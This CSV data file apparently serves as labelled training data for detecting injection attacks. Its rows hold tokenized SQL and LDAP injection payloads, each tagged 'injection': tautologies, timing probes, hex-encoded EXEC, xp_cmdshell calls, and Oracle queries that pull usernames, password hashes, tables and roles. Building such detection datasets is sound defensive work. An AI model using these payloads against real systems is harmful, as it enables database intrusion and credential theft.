49,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
50,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
51,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
52,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
53,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
54,,injection
0,LT GT DQUT SQUT PRCNT SMCLN RPRN LPRN BITAND PLUS,injection
1,BITOR,injection
2,EXCLM,injection
3,QSTN,injection
4,SLSH,injection
5,SLSH SLSH,injection
6,SLSH SLSH STAR,injection
7,SQUT,injection
8,SQUT MINUS MINUS,injection
9,LPRN,injection
10,RPRN,injection
11,STAR BITOR,injection
12,STAR SLSH STAR,injection
13,BITAND,injection
14,INT,injection
15,INT,injection
16,INT OR INT EQ INT,injection
17,0x730065006c00650063007400200040004000760065007200730069006f006e00 EXEC LPRN ATR q RPRN,injection
18,0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a,injection
19,0x77616974666f722064656c61792027303a303a31302700 EXEC LPRN ATR s RPRN,injection
20,INT SMCLN LPRN load_file LPRN CHAR LPRN INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT RPRN RPRN RPRN CMMA INT CMMA INT CMMA INT SMCLN,injection
21,INT OR INT EQ INT,injection
22,INT SMCLN SELECT PRCNT INT STAR,injection
23,INT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
24,SQUT PRCNT 20or PRCNT INT SQUT SQUT EQ SQUT,injection
25,SQUT PRCNT 20or PRCNT INT EQ INT,injection
26,SQUT RPRN PRCNT 20or PRCNT INT LPRN SQUT x SQUT EQ SQUT x,injection
27,SQUT PRCNT 20or PRCNT INT SQUT x SQUT EQ SQUT x,injection
28,PRCNT 20or PRCNT 20x EQ x,injection
29,PRCNT INT SQUT sleep PRCNT INT SQUT,injection
30,PRCNT INT DLLR LPRN sleep PRCNT INT RPRN,injection
31,PRCNT INT,injection
32,INT OR INT EQ INT,injection
33,PRCNT INT,injection
34,PRCNT INT PRCNT 20or PRCNT INT EQ INT,injection
35,PRCNT INT,injection
36,PRCNT INT,injection
37,PRCNT 2a PRCNT INT PRCNT 7c PRCNT 28mail PRCNT 3d PRCNT 2a PRCNT INT PRCNT INT,injection
38,PRCNT 2a PRCNT INT PRCNT 7c PRCNT 28objectclass PRCNT 3d PRCNT 2a PRCNT INT PRCNT INT,injection
39,PRCNT 2a PRCNT 7c,injection
40,BITOR BITOR INT,injection
41,SQUT BITOR BITOR SQUT INT,injection
42,LPRN BITOR BITOR INT RPRN,injection
43,PRCNT 7c,injection
44,A SQUT,injection
45,ADMIN SQUT OR SQUT,injection
46,SQUT AND INT EQ LPRN IF LPRN LPRN load_file LPRN CHAR LPRN INT CMMA INT CMMA INT CMMA INT CMMA INT RPRN RPRN LT GT CHAR LPRN INT CMMA INT RPRN RPRN CMMA INT CMMA INT RPRN RPRN SMCLN,injection
47,SQUT AND INT IN LPRN SELECT var FROM TEMP RPRN MINUS MINUS,injection
48,anything SQUT OR SQUT x SQUT EQ SQUT x,injection
49,DQUT A DQUT DQUT OR INT EQ INT MINUS MINUS DQUT,injection
50,A SQUT OR INT EQ INT MINUS MINUS,injection
51,DQUT A DQUT DQUT OR INT EQ INT MINUS MINUS DQUT,injection
52,A SQUT OR INT EQ INT MINUS MINUS,injection
53,A SQUT OR SQUT A SQUT EQ SQUT A,injection
54,BITAND apos SMCLN PRCNT 20or,injection
55,AS,injection
56,ASC,injection
57,A SQUT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
58,SQUT SMCLN BEGIN DECLARE ATR var VARCHAR LPRN INT RPRN SET ATR var EQ SQUT CLN SQUT SELECT ATR var EQ ATR var PLUS SQUT PLUS login PLUS SQUT SLSH SQUT PLUS PASSWORD PLUS SQUT SQUT FROM users WHERE login GT,injection
59,bfilename,injection
60,CHAR PRCNT INT PRCNT INT PRCNT 2b PRCNT 40select,injection
61,DECLARE ATR q nvarchar LPRN INT RPRN 0x730065006c00650063007400200040004000760065007200730069006f006e00 EXEC LPRN ATR q RPRN,injection
62,DECLARE ATR q nvarchar LPRN INT RPRN SELECT ATR q EQ 0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 EXEC LPRN ATR q RPRN,injection
63,DECLARE ATR q nvarchar LPRN INT RPRN SELECT ATR q EQ,injection
64,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x73656c65637420404076657273696f6e EXEC LPRN ATR s RPRN,injection
65,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x77616974666f722064656c61792027303a303a31302700 EXEC LPRN ATR s RPRN,injection
66,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ,injection
67,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x73656c65637420404076657273696f6e,injection
68,DELETE,injection
69,DESC,injection
70,DISTINCT,injection
71,SQUT BITOR BITOR LPRN elt LPRN MINUS INT PLUS INT CMMA bin LPRN INT RPRN CMMA ord LPRN INT RPRN CMMA HEX LPRN CHAR LPRN INT RPRN RPRN RPRN RPRN,injection
72,SQUT SMCLN EXEC master DOT DOT xp_cmdshell,injection
73,SQUT SMCLN EXEC master DOT DOT xp_cmdshell SQUT ping INT DOT INT DOT INT DOT INT SQUT MINUS MINUS,injection
74,EXEC LPRN ATR s RPRN,injection
75,SQUT SMCLN EXEC LPRN SQUT sel SQUT PLUS SQUT ect us SQUT PLUS SQUT er SQUT RPRN,injection
76,EXEC sp,injection
